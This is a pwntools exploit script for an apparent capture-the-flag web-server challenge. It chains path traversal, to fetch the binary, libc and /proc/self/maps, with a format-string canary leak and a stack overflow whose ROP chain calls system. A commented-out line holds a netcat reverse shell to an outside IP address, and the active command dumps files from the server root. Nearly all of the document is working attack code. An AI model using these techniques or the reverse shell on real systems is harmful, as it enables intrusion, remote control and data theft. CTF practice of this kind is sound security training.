#!/bin/env python3
from pwn import *
from urllib.parse import quote
import re

if not args.LOCAL:
    HOST, PORT = "intechfest.cc:49468".split(":")
else:
    HOST, PORT = "localhost:8000".split(":")
BINARY = "chall"
if not args.GETBINARY:
    context.log_level = logging.DEBUG
    context.binary = exe = ELF(BINARY, checksec=False)
    if args.LOCAL:
        libc = ELF("/usr/lib/libc.so.6", checksec=False)
    else:
        libc = ELF("libc.so", checksec=False)
    context.terminal = "konsole -e".split()
    context.bits = 64
    context.arch = "amd64"


class BaseExploit:
    def __init__(self):
        if args.LOCAL:
            self.p = process(env={'LD_PRELOAD': libc.path})

    def debug(self, script=None):
        if args.LOCAL:
            if script:
                attach(self.p, "\n".join(script))
            else:
                attach(self.p)


class Utils(BaseExploit):
    def get_file(s, filename):
        with remote(HOST, PORT) as p:
            req = f"GET /../../../../../../../../../../../../../../../../{filename} HTTP/1.1\r\nHost: localhost\r\n\r\n"
            p.send(req.encode())
            if args.LOCAL or args.TEST:
                p.recvuntil(b"\n\n")
                res = p.recvall()
            else:
                p.recvuntil(b"\r\n\r\n")
                res = s.receive_chunks(p)

            return res

    def get_binary(s):
        res = s.get_file("/app/neko")
        with open("chall", "wb") as f:
            f.write(res)
        return

    def get_libc(s):
        res = s.get_file("/usr/lib/x86_64-linux-gnu/libc.so.6")
        with open("libc.so", "wb") as f:
            f.write(res)
        return

    def get_maps(s):
        return s.get_file("/proc/self/maps").decode()

    def get_base_addr(s):
        maps = s.get_maps()
        base_addr = re.findall(r"^.*?00000000", maps)[0]
        main_base = eval("0x"+base_addr[:12])
        base_addr = re.findall(r".*?libc.so", maps)[0]
        libc_base = eval("0x"+base_addr[:12])
        return libc_base, main_base

    def receive_chunks(s, sock: remote):
        chunks = []
        while True:
            chunk_size_str = b""
            while chunk_size_str == b"":
                while True:
                    char = sock.recv(1, timeout=1)
                    if char == b"\r":
                        continue
                    if char == b"\n":
                        break
                    chunk_size_str += char
            chunk_size = int(chunk_size_str, 16)
            if chunk_size == 0:
                break
            chunk_data = b""
            while chunk_size > 0:
                data = sock.recv(chunk_size)
                chunk_data += data
                chunk_size -= len(data)
            chunks.append(chunk_data)
        return b"".join(chunks)


class Request(Utils):
    def post(s, data):
        data_encoded = quote(data).encode()
        req = (b"""\
POST / HTTP/1.1
Host: localhost
User-Agent: curl/8.1.2
Accept: */*
Length: """+str(len(data)).encode()+b"""
Content-Length: """+str(len(data_encoded)).encode()+b"""
Content-Type: application/x-www-form-urlencoded

""").replace(b"\n", b"\r\n")+data_encoded
        with remote(HOST, PORT) as p:
            p.send(req)
            if args.LOCAL or args.TEST:
                res = p.recvall()
                res = res[res.find(b"\n\n")+2:]
            else:
                res = p.recvuntil(b"\r\n\r\n", timeout=2)
                if b"200" not in res:
                    s.post(data)
                res = s.receive_chunks(p)
            return res


class Exploit(Request):
    ...


if __name__ == "__main__":
    x = Exploit()
    if args.GETBINARY:
        x.get_binary()
        x.get_libc()
        exit()
    if args.GETCANARY:
        # 27
        with context.silent:
            for i in range(21, 50):
                res = x.post(f"%{i}$p".encode())
                print(i, res)
            exit()
    res = x.post("%27$p".encode())
    canary = eval(res)
    info("canary: 0x%x", canary)
    libc.address, exe.address = x.get_base_addr()
    info("main addr: 0x%x", exe.address)
    info("libc addr: 0x%x", libc.address)
    if args.DBG:
        x.debug((
            # "source /usr/share/pwngdb/.gdbinit",
            "set follow-fork-mode child",
            "source /usr/share/gef/gef.py",
            # "b *route+821",
            "b *route+842",  # ret
            "b *system+27",
            "c"
        ))
    # cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 108.137.37.157 4444 >/tmp/f"
    cmd = "echo 'HTTP/1.1 200 OK\\n\\n';cat /*"
    padding = flat(cmd.ljust(664, "\0"), p64(canary), 0)

    lrp = ROP(libc)
    lrp.call(exe.sym['route']+473)  # POST("/admin")
    lrp.exit()
    print(lrp.dump())
    payload = flat(padding, lrp)
    print(x.post(payload).decode())
    if args.LOCAL:
        x.p.interactive()
